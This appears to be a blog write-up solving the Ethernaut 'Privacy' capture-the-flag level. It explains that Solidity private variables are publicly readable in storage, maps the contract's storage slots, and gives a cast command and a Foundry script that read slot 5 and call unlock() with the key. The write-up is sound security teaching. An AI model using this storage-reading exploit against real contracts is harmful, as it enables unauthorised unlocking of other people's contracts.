---
title: 'Privacy - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level12.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-19
lastmod: 2025-09-19
---

## Challenge Overview

This level involves a contract that attempts to protect sensitive data using private variables. However, all data stored on the blockchain is publicly accessible. The goal is to extract the key from storage and use it to unlock the contract.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

---

## Exploit Explanation

The vulnerability stems from the misconception that `private` variables are hidden on the blockchain. In reality, all contract storage is publicly readable. The `private` keyword only prevents other contracts from directly accessing these variables - it doesn't hide the data from blockchain explorers or direct storage access.

### Storage Layout Analysis

Understanding how variables are packed in storage:

- **Slot 0**: `bool public locked` (1 byte)
- **Slot 1**: `uint256 public ID` (32 bytes - occupies full slot)
- **Slot 2**: Packed variables:
  - `uint8 private flattening` (1 byte)
  - `uint8 private denomination` (1 byte) 
  - `uint16 private awkwardness` (2 bytes)
  - Total: 4 bytes (remaining 28 bytes unused)
- **Slot 3**: `bytes32[3] private data[0]` (32 bytes)
- **Slot 4**: `bytes32[3] private data[1]` (32 bytes)
- **Slot 5**: `bytes32[3] private data[2]` (32 bytes) ← **This contains our key**

The key to unlock the contract is stored in `data[2]` at storage slot 5.

---

## Exploit Steps

1. **Read storage slot 5** to get the `bytes32` key value:
   ```bash
   cast storage <YOUR_INSTANCE> 5 --rpc-url $SEPOLIA_URL
   ```
   Returns: `0xe6dd9b7773267803f7e98c2a32f85b912afa06b9b90a477db2ae663e098bb333`

2. **Convert to bytes16** by taking the first 16 bytes (truncating from 32 bytes to 16 bytes)

3. **Call unlock()** with the converted bytes16 value

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Privacy.sol";

contract PrivacySolution is Script {
    
    Privacy public privacyInstance = Privacy(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Extract the key from storage slot 5 and convert to bytes16
        bytes32 key = 0xe6dd9b7773267803f7e98c2a32f85b912afa06b9b90a477db2ae663e098bb333;
        privacyInstance.unlock(bytes16(key));
        
        // Verify the contract is unlocked
        console.log("Contract locked status:", privacyInstance.locked());
        
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/PrivacySolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```